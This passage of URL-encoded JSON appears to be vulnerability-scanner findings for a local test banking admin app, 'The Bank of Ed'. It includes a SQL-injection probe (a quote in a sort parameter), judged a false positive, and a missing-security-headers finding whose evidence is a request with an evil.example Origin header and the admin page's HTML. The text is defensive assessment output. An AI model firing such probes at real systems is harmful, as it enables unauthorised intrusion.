2GET%20%2Fapi%2Ftransactions%3Faccount_id%3D3%26page%3D999%26per_page%3D15%26sort%3Dcreated_at%2527%20without%20authentication.%22%2C%22response_evidence%22%3A%22HTTP%20500%20JSON%20with%20code%20INTERNAL_ERROR%20and%20raw%20SQL%20error%20plus%20full%20PHP%20stack%20trace.%22%2C%22finding_source%22%3A%22dynamic_scan%22%2C%22validation_status%22%3A%22false_positive%22%2C%22validation_note%22%3A%22The%20scanner's%20key%20assumption%20is%20wrong%3A%20the%20transaction%20endpoint%20is%20not%20accessible%20without%20authentication.%20A%20direct%20anonymous%20comparison%20of%20both%20the%20valid%20sort%20value%20and%20the%20exact%20malformed%20sort%20value%20returned%20the%20same%20HTTP%20401%20JSON%20response%20stating%20%60Missing%20or%20invalid%20Authorization%20header%60%2C%20with%20no%20SQL%20error%2C%20file%20path%2C%20or%20stack%20trace.%20The%20concrete%20benign%20explanation%20is%20that%20authentication%20middleware%20handles%20the%20request%20before%20the%20transaction%20query%20runs%2C%20so%20the%20reported%20unauthenticated%20information%20disclosure%20is%20not%20reachable.%22%2C%22merged_instances%22%3A%22%5B%5D%22%2C%22poc_command%22%3A%22%22%2C%22poc_setup%22%3A%22%22%7D%2C%7B%22owasp_category%22%3A%22A05%22%2C%22severity%22%3A%22info%22%2C%22title%22%3A%22Banking%20page%20lacks%20browser%20security%20headers%22%2C%22description%22%3A%22The%20admin%20HTML%20response%20does%20not%20include%20Content-Security-Policy%2C%20X-Frame-Options%2C%20X-Content-Type-Options%2C%20or%20Referrer-Policy%20headers.%22%2C%22impact%22%3A%22The%20missing%20controls%20may%20increase%20the%20impact%20of%20separate%20client-side%20vulnerabilities%20and%20leave%20the%20interface%20exposed%20to%20framing%20attacks.%22%2C%22likelihood%22%3A%22The%20configuration%20is%20confirmed%2C%20but%20no%20direct%20exploit%20or%20sensitive%20data%20exposure%20was%20demonstrated.%22%2C%22recommendation%22%3A%22Set%20an%20appropriate%20Content-Security-Policy%2C%20prevent%20unauthorized%20framing%20with%20frame-ancestors%2C%20add%20X-Content-Type-Options%3A%20nosniff%2C%20and%20define%20a%20Referrer-Policy.%22%2C%22cvss_score%22%3A0%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AH%2FPR%3AN%2FUI%3AR%2FS%3AU%2FC%3AN%2FI%3AN%2FA%3AN%22%2C%22affected_url%22%3A%22http%3A%2F%2Flocalhost%3A8081%2Fadmin%2F%22%2C%22evidence%22%3A%22GET%20%2Fadmin%2F%20returned%20200%20with%20HTML%2C%20but%20the%20response%20headers%20contained%20none%20of%20the%20listed%20browser%20security%20headers.%5Cn%5CnREQUEST%3A%5CnGET%20http%3A%2F%2Flocalhost%3A8081%2Fadmin%2F%5Cnuse_session%3A%20anonymous%20%20Authorization%3A%20present%5CnCookies%3A%20none%5Cn%7B%5C%22Origin%5C%22%3A%20%5C%22https%3A%2F%2Fevil.example%5C%22%7D%5Cn%5CnRESPONSE%3A%5CnStatus%3A%20200%5Cndate%3A%20Tue%2C%2008%20Sep%202026%2013%3A29%3A35%20GMT%5Cnserver%3A%20Apache%2F2.4.68%20(Unix)%5Cnlast-modified%3A%20Sun%2C%2023%20Aug%202026%2012%3A34%3A31%20GMT%5Cnetag%3A%20%5C%224c9c-659b6175aa3c0%5C%22%5Cnaccept-ranges%3A%20bytes%5Cncontent-length%3A%2019612%5Cnkeep-alive%3A%20timeout%3D5%2C%20max%3D100%5Cnconnection%3A%20Keep-Alive%5Cncontent-type%3A%20text%2Fhtml%5Cn%5Cn%3C!DOCTYPE%20html%3E%5Cn%3Chtml%20lang%3D%5C%22en%5C%22%3E%5Cn%3Chead%3E%5Cn%20%20%3Cmeta%20charset%3D%5C%22UTF-8%5C%22%3E%5Cn%20%20%3Cmeta%20name%3D%5C%22viewport%5C%22%20content%3D%5C%22width%3Ddevice-width%2C%20initial-scale%3D1.0%5C%22%3E%5Cn%20%20%3Ctitle%3EThe%20Bank%20of%20Ed%20-%20Admin%3C%2Ftitle%3E%5Cn%20%20%3Clink%20rel%3D%5C%22preconnect%5C%22%20href%3D%5C%22https%3A%2F%2Ffonts.googleapis.com%5C%22%3E%5Cn%20%20%3Clink%20rel%3D%5C%22preconnect%5C%22%20href%3D%5C%22https%3A%2F%2Ffonts.gstatic.com%5C%22%20crossorigin%3E%5Cn%20%20%3Clink%20href%3D%5C%22https%3A%2F%2Ffonts.googleapis.com%2Fcss2%3Ffamily%3DInter%3Awght%40300%3B400%3B500%3B600%3B700%26display%3Dswap%5C%22%20rel%3D%5C%22stylesheet%5C%22%3E%5Cn%20%20%3Cscript%20src%3D%5C%22https%3A%2F%2Fcdn.tailwindcss.com%5C%22%3E%3C%2Fscript%3E%5Cn%20%20%3Cscript%3E%5Cn%20%20%20%20tailwind.config%20%3D%20%7B%5Cn%20%20%20%20%20%20theme%3A%20%7B%5Cn%20%20%20%20%20%20%20%20extend%3A%20%7B%5Cn%20%20%20%20%20%20%20%20%20%20colors%3A%20%7B%5Cn%20%20%20%20%20%20%20%20%20%20%20%20dark%3A%20%7B%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%2050%3A%20'%23f4f4f5'%2C%20100%3A%20'%23e4e4e7'%2C%20200%3A%20'%23d4d4d8'%2C%20300%3A%20'%23a1a1aa'%2C%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20400%3A%20'%2371717a'%2C%20500%3A%20'%2352525b'%2C%20600%3A%20'%233f3f46'%2C%20700%3A%20'%2327272a'%2C%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20800%3A%20'%2318181b'%2C%20900%3A%20'%2309090b'%2C%20950%3A%20'%23030305'%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%7D%5Cn%20%20%20%20%20%20%20%20%20%20%7D%2C%5Cn%20%20%20%20%20%20%20%20%20%20fontFamily%3A%20%7B%20sans%3A%20%5B'Inter'%2C%20'system-ui'%2C%20'sans-serif'%5D%20%7D%5Cn%20%20%20%20%20%20%20%20%7D%5Cn%20%20%20%20%20%20%7D%5Cn%20%20%20%20%7D%5Cn%20%20%3C%2Fscript%3E%5Cn%20%20%3Clink%20rel%3D%5C%22stylesheet%5C%22%20href%3D%5C%22css%2Fapp.css%5C%22%3E%5Cn%3C%2Fhead%3E%5Cn%3Cbody%20class%3D%5C%22bg-dark-50%20font-sans%20text-dark-800%5C%22%3E%5Cn%5Cn%20%20%3C!--%20Toast%20Container%20--%3E%5Cn%20%20%3Cdiv%20id%3D%5C%22toast-container%5C%22%20class%3D%5C%22fixed%20top-4%20right-4%20z-50%20space-y-2%5C%22%3E%3C%2Fdiv%3E%5Cn%5Cn%20%20%3C!--%20Modal%20Overlay%20--%3E%5Cn%20%20%3Cdiv%20id%3D%5C%22modal-overlay%5C%22%20class%3D%5C%22hidden%20fixed%20inset-0%20z-40%20bg-black%2F50%20backdrop-blur-sm%20flex%20items-center%20justify-center%20p-4%5C%22%3E%5Cn%20%20%20%20%3Cdiv%20id%3D%5C%22modal-content%5C%22%20class%3D%5C%22bg-white%20rounded-2xl%20shadow-2xl%20w-full%20max-w-md%20max-h-%5B90vh%5D%20overflow-y-auto%5C%22%3E%3C%2Fdiv%3E%5Cn%20%20%3C%2Fdiv%3E%5Cn%5Cn%20%20%3C!--%20%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%20AUTH%20VIEW%20%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%20--%3E%5Cn%20%20%3Cdiv%20id%3D%5C%22view-auth%5C%22%20class%3D%5C%22hidden%20min-h-screen%20flex%20items-center%20justify-center%20bg-gradient-to-br%20from-dark-900%20via-dark-800%20to-dark-950%20p-4%5C%22%3E%5Cn%20%20%20%20%3Cdiv%20class%3D%5C%22w-full%20max-w-md%5C%22%3E%5Cn%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22text-center%20mb-8%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22inline-flex%20items-center%20gap-3%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22w-12%20h-12%20bg-red-600%20rounded-xl%20flex%20items-center%20justify-center%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-7%20h-7%20text-white%5C%22%20fill%3D%5C%22none%5C%22%20stroke%3D%5C%22currentColor%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M10.325%204.317c.426-1.756%202.924-1.756%203.35%200a1.724%201.724%200%20002.573%201.066c1.543-.94%203.31.826%202.37%202.37a1.724%201.724%200%20001.066%202.573c1.756.426%201.756%202.924%200%203.35a1.724%201.724%200%2000-1.066%202.573c.94%201.543-.826%203.31-2.37%202.37a1.724%201.724%200%2000-2.573%201.066c-.426%201.756-2.924%201.756-3.35%200a1.724%201.724%200%2000-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724%201.724%200%2000-1.066-2.573c-1.756-.426-1.756-2.924%200-3.35a1.724%201.724%200%20001.066-2.573c-.94-1.543.826-3.31%202.37-2.37.996.608%202.296.07%202.572-1.065z%5C%22%3E%3C%2Fpath%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M15%2012a3%203%200%2011-6%200%203%203%200%20016%200z%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Ch1%20class%3D%5C%22text-3xl%20font-bold%20text-white%5C%22%3EThe%20Bank%20of%20Ed%3C%2Fh1%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%3Cp%20class%3D%5C%22text-dark-400%20mt-2%5C%22%3EAdministration%20Panel%3C%2Fp%3E%5Cn%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%5Cn%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22bg-white%20rounded-2xl%20shadow-2xl%20overflow-hidden%20p-8%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%3Cform%20id%3D%5C%22login-form%5C%22%20onsubmit%3D%5C%22BankOfEdAdmin.AuthPage.handleLogin(event)%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22space-y-5%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Clabel%20class%3D%5C%22block%20text-sm%20font-medium%20text-dark-700%20mb-1.5%5C%22%3EUsername%3C%2Flabel%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20type%3D%5C%22text%5C%22%20name%3D%5C%22username%5C%22%20required%20class%3D%5C%22w-full%20px-4%20py-3%20rounded-xl%20border%20border-dark-200%20focus%3Aring-2%20focus%3Aring-red-500%20focus%3Aborder-red-500%20outline-none%20transition%5C%22%20placeholder%3D%5C%22admin%5C%22%20autofocus%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Clabel%20class%3D%5C%22block%20text-sm%20font-medium%20text-dark-700%20mb-1.5%5C%22%3EPassword%3C%2Flabel%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20type%3D%5C%22password%5C%22%20name%3D%5C%22password%5C%22%20required%20class%3D%5C%22w-full%20px-4%20py-3%20rounded-xl%20border%20border-dark-200%20focus%3Aring-2%20focus%3Aring-red-500%20focus%3Aborder-red-500%20outline-none%20transition%5C%22%20placeholder%3D%5C%22Enter%20password%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20id%3D%5C%22login-errors%5C%22%20class%3D%5C%22mt-4%20text-sm%20text-red-600%20hidden%5C%22%3E%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cbutton%20type%3D%5C%22submit%5C%22%20class%3D%5C%22w-full%20mt-6%20bg-red-600%20hover%3Abg-red-700%20text-white%20font-semibold%20py-3%20rounded-xl%20transition-colors%20flex%20items-center%20justify-center%20gap-2%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cspan%3ESign%20In%3C%2Fspan%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-4%20h-4%20animate-spin%20hidden%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Ccircle%20class%3D%5C%22opacity-25%5C%22%20cx%3D%5C%2212%5C%22%20cy%3D%5C%2212%5C%22%20r%3D%5C%2210%5C%22%20stroke%3D%5C%22currentColor%5C%22%20stroke-width%3D%5C%224%5C%22%20fill%3D%5C%22none%5C%22%3E%3C%2Fcircle%3E%3Cpath%20class%3D%5C%22opacity-75%5C%22%20fill%3D%5C%22currentColor%5C%22%20d%3D%5C%22M4%2012a8%208%200%20018-8V0C5.373%200%200%205.373%200%2012h4z%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3C%2Fbutton%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fform%3E%5Cn%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%3C%2Fdiv%3E%5Cn%5Cn%20%20%3C!--%20%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%20APP%20SHELL%20%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%20--%3E%5Cn%20%20%3Cdiv%20id%3D%5C%22app-shell%5C%22%20class%3D%5C%22hidden%20flex%20h-screen%20overflow-hidden%5C%22%3E%5Cn%5Cn%20%20%20%20%3C!--%20Mobile%20Header%20--%3E%5Cn%20%20%20%20%3Cdiv%20class%3D%5C%22lg%3Ahidden%20fixed%20top-0%20left-0%20right-0%20z-30%20bg-dark-900%20text-white%20flex%20items-center%20justify-between%20px-4%20py-3%5C%22%3E%5Cn%20%20%20%20%20%20%3Cbutton%20onclick%3D%5C%22BankOfEdAdmin.App.toggleSidebar()%5C%22%20class%3D%5C%22p-2%20hover%3Abg-dark-800%20rounded-lg%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-6%20h-6%5C%22%20fill%3D%5C%22none%5C%22%20stroke%3D%5C%22currentColor%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M4%206h16M4%2012h16M4%2018h16%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%3C%2Fbutton%3E%5Cn%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22flex%20items-center%20gap-2%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22w-8%20h-8%20bg-red-600%20rounded-lg%20flex%20items-center%20justify-center%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-5%20h-5%20text-white%5C%22%20fill%3D%5C%22none%5C%22%20stroke%3D%5C%22currentColor%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M10.325%204.317c.426-1.756%202.924-1.756%203.35%200a1.724%201.724%200%20002.573%201.066c1.543-.94%203.31.826%202.37%202.37a1.724%201.724%200%20001.066%202.573c1.756.426%201.756%202.924%200%203.35a1.724%201.724%200%2000-1.066%202.573c.94%201.543-.826%203.31-2.37%202.37a1.724%201.724%200%2000-2.573%201.066c-.426%201.756-2.924%201.756-3.35%200a1.724%201.724%200%2000-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724%201.724%200%2000-1.066-2.573c-1.756-.426-1.756-2.924%200-3.35a1.724%201.724%200%20001.066-2.573c-.94-1.543.826-3.31%202.37-2.37.996.608%202.296.07%202.572-1.065z%5C%22%3E%3C%2Fpath%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M15%2012a3%203%200%2011-6%200%203%203%200%20016%200z%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%3Cspan%20class%3D%5C%22font-semibold%5C%22%3EAdmin%3C%2Fspan%3E%5Cn%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22w-10%5C%22%3E%3C%2Fdiv%3E%5Cn%20%20%20%20%3C%2Fdiv%3E%5Cn%5Cn%20%20%20%20%3C!--%20Sidebar%20Overlay%20(mobile)%20--%3E%5Cn%20%20%20%20%3Cdiv%20id%3D%5C%22sidebar-overlay%5C%22%20onclick%3D%5C%22BankOfEdAdmin.App.toggleSidebar()%5C%22%20class%3D%5C%22hidden%20fixed%20inset-0%20z-30%20bg-black%2F50%20lg%3Ahidden%5C%22%3E%3C%2Fdiv%3E%5Cn%5Cn%20%20%20%20%3C!--%20Sidebar%20--%3E%5Cn%20%20%20%20%3Caside%20id%3D%5C%22sidebar%5C%22%20class%3D%5C%22fixed%20lg%3Astatic%20inset-y-0%20left-0%20z-40%20w-64%20bg-dark-900%20text-white%20flex%20flex-col%20transform%20-translate-x-full%20lg%3Atranslate-x-0%20transition-transform%20duration-200%5C%22%3E%5Cn%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22p-6%20flex%20items-center%20gap-3%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22w-10%20h-10%20bg-red-600%20rounded-xl%20flex%20items-center%20justify-center%20flex-shrink-0%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-6%20h-6%20text-white%5C%22%20fill%3D%5C%22none%5C%22%20stroke%3D%5C%22currentColor%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M10.325%204.317c.426-1.756%202.924-1.756%203.35%200a1.724%201.724%200%20002.573%201.066c1.543-.94%203.31.826%202.37%202.37a1.724%201.724%200%20001.066%202.573c1.756.426%201.756%202.924%200%203.35a1.724%201.724%200%2000-1.066%202.573c.94%201.543-.826%203.31-2.37%202.37a1.724%201.724%200%2000-2.573%201.066c-.426%201.756-2.924%201.756-3.35%200a1.724%201.724%200%2000-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724%201.724%200%2000-1.066-2.573c-1.756-.426-1.756-2.924%200-3.35a1.724%201.724%200%20001.066-2.573c-.94-1.543.826-3.31%202.37-2.37.996.608%202.296.07%202.572-1.065z%5C%22%3E%3C%2Fpath%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M15%2012a3%203%200%2011-6%200%203%203%200%20016%200z%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%3Cdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Ch2%20class%3D%5C%22font-bold%20text-lg%5C%22%3EThe%20Bank%20of%20Ed%3C%2Fh2%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cp%20class%3D%5C%22text-xs%20text-dark-400%5C%22%3EAdmin%20Panel%3C%2Fp%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%5Cn%20%20%20%20%20%20%3Cnav%20class%3D%5C%22flex-1%20px-3%20space-y-1%20mt-2%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%3Ca%20href%3D%5C%22%23%2Fcustomers%5C%22%20data-nav%3D%5C%22customers%5C%22%20class%3D%5C%22nav-link%20flex%20items-center%20gap-3%20px-4%20py-3%20rounded-xl%20text-dark-300%20hover%3Atext-white%20hover%3Abg-dark-800%20transition-colors%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-5%20h-5%5C%22%20fill%3D%5C%22none%5C%22%20stroke%3D%5C%22currentColor%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M17%2020h5v-2a3%203%200%2000-5.356-1.857M17%2020H7m10%200v-2c0-.656-.126-1.283-.356-1.857M7%2020H2v-2a3%203%200%20015.356-1.857M7%2020v-2c0-.656.126-1.283.356-1.857m0%200a5.002%205.002%200%20019.288%200M15%207a3%203%200%2011-6%200%203%203%200%20016%200z%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cspan%3ECustomers%3C%2Fspan%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fa%3E%5Cn%20%20%20%20%20%20%20%20%3Ca%20href%3D%5C%22%23%2Faccounts%5C%22%20data-nav%3D%5C%22accounts%5C%22%20class%3D%5C%22nav-link%20flex%20items-center%20gap-3%20px-4%20py-3%20rounded-xl%20text-dark-300%20hover%3Atext-white%20hover%3Abg-dark-800%20transition-colors%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-5%20h-5%5C%22%20fill%3D%5C%22none%5C%22%20stroke%3D%5C%22currentColor%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M3%2010h18M7%2015h1m4%200h1m-7%204h12a3%203%200%20003-3V8a3%203%200%2000-3-3H6a3%203%200%2000-3%203v8a3%203%200%20003%203z%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cspan%3EAccounts%3C%2Fspan%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fa%3E%5Cn%20%20%20%20%20%20%20%20%3Ca%20href%3D%5C%22%23%2Ffx-rates%5C%22%20data-nav%3D%5C%22fx-rates%5C%22%20class%3D%5C%22nav-link%20flex%20items-center%20gap-3%20px-4%20py-3%20rounded-xl%20text-dark-300%20hover%3Atext-white%20hover%3Abg-dark-800%20transition-colors%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-5%20h-5%5C%22%20fill%3D%5C%22none%5C%22%20stroke%3D%5C%22currentColor%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M12%208c-1.657%200-3%20.895-3%202s1.343%202%203%202%203%20.895%203%202-1.343%202-3%202m0-8c1.11%200%202.08.402%202.599%201M12%208V7m0%201v8m0%200v1m0-1c-1.11%200-2.08-.402-2.599-1M21%2012a9%209%200%2011-18%200%209%209%200%200118%200z%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cspan%3EFX%20Rates%3C%2Fspan%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fa%3E%5Cn%20%20%20%20%20%20%20%20%3Ca%20href%3D%5C%22%23%2Fsystem%5C%22%20data-nav%3D%5C%22system%5C%22%20class%3D%5C%22nav-link%20flex%20items-center%20gap-3%20px-4%20py-3%20rounded-xl%20text-dark-300%20hover%3Atext-white%20hover%3Abg-dark-800%20transition-colors%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-5%20h-5%5C%22%20fill%3D%5C%22none%5C%22%20stroke%3D%5C%22currentColor%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M4%204v5h.582m15.356%202A8.001%208.001%200%20004.582%209m0%200H9m11%2011v-5h-.581m0%200a8.003%208.003%200%2001-15.357-2m15.357%202H15%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cspan%3ESystem%3C%2Fspan%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fa%3E%5Cn%20%20%20%20%20%20%3C%2Fnav%3E%5Cn%5Cn%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22p-4%20border-t%20border-dark-800%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22flex%20items-center%20gap-3%20mb-3%20px-2%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22w-9%20h-9%20bg-dark-700%20rounded-full%20flex%20items-center%20justify-center%20text-sm%20font-semibold%5C%22%20id%3D%5C%22sidebar-avatar%5C%22%3EA%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22min-w-0%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%20class%3D%5C%22text-sm%20font-medium%20truncate%5C%22%20id%3D%5C%22sidebar-admin-name%5C%22%3EAdmin%3C%2Fp%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%3Cbutton%20onclick%3D%5C%22BankOfEdAdmin.App.logout()%5C%22%20class%3D%5C%22w-full%20flex%20items-center%20gap-3%20px-4%20py-2.5%20rounded-xl%20text-dark-400%20hover%3Atext-red-400%20hover%3Abg-dark-800%20transition-colors%20text-sm%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Csvg%20class%3D%5C%22w-5%20h-5%5C%22%20fill%3D%5C%22none%5C%22%20stroke%3D%5C%22currentColor%5C%22%20viewBox%3D%5C%220%200%2024%2024%5C%22%3E%3Cpath%20stroke-linecap%3D%5C%22round%5C%22%20stroke-linejoin%3D%5C%22round%5C%22%20stroke-width%3D%5C%222%5C%22%20d%3D%5C%22M17%2016l4-4m0%200l-4-4m4%204H7m6%204v1a3%203%200%2001-3%203H6a3%203%200%2001-3-3V7a3%203%200%20013-3h4a3%203%200%20013%203v1%5C%22%3E%3C%2Fpath%3E%3C%2Fsvg%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cspan%3ESign%20Out%3C%2Fspan%3E%5Cn%20%20%20%20%20%20%20%20%3C%2Fbutton%3E%5Cn%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%3C%2Faside%3E%5Cn%5Cn%20%20%20%20%3C!--%20Main%20Content%20--%3E%5Cn%20%20%20%20%3Cmain%20class%3D%5C%22flex-1%20overflow-y-auto%20pt-14%20lg%3Apt-0%5C%22%3E%5Cn%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22p-4%20sm%3Ap-6%20lg%3Ap-8%20max-w-7xl%20mx-auto%5C%22%3E%5Cn%5Cn%20%20%20%20%20%20%20%20%3C!--%20Customers%20List%20--%3E%5Cn%20%20%20%20%20%20%20%20%3Csection%20id%3D%5C%22page-customers%5C%22%20class%3D%5C%22hidden%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22flex%20items-center%20justify-between%20mb-6%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ch1%20class%3D%5C%22text-2xl%20font-bold%20text-dark-900%5C%22%3ECustomers%3C%2Fh1%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cp%20class%3D%5C%22text-dark-500%20mt-1%5C%22%3EManage%20customer%20accounts%3C%2Fp%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%5C%22flex%20items-center%20gap-3%5C%22%3E%5Cn%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20type%3D%5C%22text%5C%22%20id%3D%5C%22customer-search%5C%22%2